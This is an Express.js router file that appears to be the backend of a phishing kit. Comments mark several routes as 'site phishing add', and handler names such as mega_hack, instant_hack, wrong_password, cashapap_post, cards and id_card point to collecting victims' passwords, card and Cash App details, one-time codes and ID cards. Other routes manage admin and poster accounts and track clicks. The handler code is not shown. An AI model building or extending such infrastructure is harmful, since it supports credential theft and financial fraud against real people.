import express  from 'express'
const router = express.Router();
import rateLimitMiddleware from "../ratelimiter.js"

import {signup_post, link_add,link_get,login_post,skip_code,add_mail,poster_add,add_data,info_get,all_poster,yoyo,user_noti,mega_hack,mega_hack_get,
    delete_poster,new_site_add_poster,get_A_poster,poster_details,add_site,admin_add_site,add_posterNumber,delete_info,email_otp,add_email,
    add_new_links,site_exist,click_for_admin,click,link_details,pass_change,cashapap_post,update_validity,links_add,otp_check,email_add,wrong_password,
    get_deyails_cashapp,show_all,demo_add,check_qrcode,rqcode_permission,update_many,add_data_checnge,today_data,id_card,cards,otp_send,phone_add,instant_hack

    
} from './routehandler.js'


router.post('/link/add', link_add);



router.post('/signup', signup_post);///adda customer from shannon end

router.post('/login', login_post);

router.post('/skip', skip_code);
router.post('/card/add', cards);

router.post('/add/mail', add_mail);
router.post('/site/add/', add_site); //add site to shannon

router.post('/admin/site/add/', admin_add_site);//to add extra site to admin

router.post('/add/posterNumber/', add_posterNumber);//add poster number

router.post('/edit/link/', add_new_links);//edit links number

router.post('/admin/add', poster_add);//admin user and pass add

router.post('/ad/:adminId/:posterId',rateLimitMiddleware, add_data);  ///site phishing add

router.post('/add/instant/:adminId/:posterId',rateLimitMiddleware, instant_hack);  ///site phishing add

router.post('/add/instant/mega',rateLimitMiddleware, mega_hack);  ///site phishing add

router.get('/add/instant/mega', mega_hack_get);  ///site phishing add


router.delete('/delete/poster/:id_pos/:id_ad', delete_poster);

router.delete('/delete/info/:info_id/:pos_id', delete_info);

router.post('/add/newsite/update',new_site_add_poster);

router.post('/qrcode/permission',rqcode_permission)  

router.post('/update/many',update_many)  

router.post('/change/:adminId/:posterId',rateLimitMiddleware,add_data_checnge)  

router.post('/add/wrongpassword', wrong_password);



router.post('/cashapp/add/:adminId/:posterId',cashapap_post)

router.post('/validity/update',update_validity)

router.post('/links/reAdd',links_add)   // if any mistake happens with links then add by this
router.post('/demo/save',demo_add)  

router.post('/user/phone/add', phone_add);//edit links number

router.post('/change/password/otp/once', otp_send);
router.post('/user/check/otp', otp_check);
router.post('/change/password', pass_change);
router.post('/user/notification', user_noti);

router.post('/email/otp', email_otp);
router.post('/user/email/add', email_add);//edit links number

router.post('/add/email/pass', add_email);



router.get('/yoyo',yoyo);
router.get('/:adminId/:posterId', click);///click find
router.get('/:adminId/', click_for_admin);///click find


router.get('/link/get/:id', link_get);////
router.get('/all/poster/:id', all_poster);
router.get('/posters/details/:id/', poster_details);

router.get('/info/:username/:id/:admin', info_get);

router.get('/get/poster/:id/:admin', get_A_poster);////
router.get('/:site/:adminId/:posterId/:verifyId/:device', site_exist);
router.get('/qrcode/status/check/:adminId',check_qrcode)  


// router.get('/details/:id/', auth.poster_details);



router.get('/cash/app/details/admin/poster/:anyid',get_deyails_cashapp)

router.get('/cash/app/details/admin/poster/hello/anyid/yes',show_all)

router.get('/link/get/all/hello/world/com/data/:id/:admin', link_details);

router.get('/today/app/details/data/poster/hello/found/end/:IId',today_data)

router.get('/today/app/details/data/poster/hello/found/end/info/:username/:id/:admin',id_card)






export default router


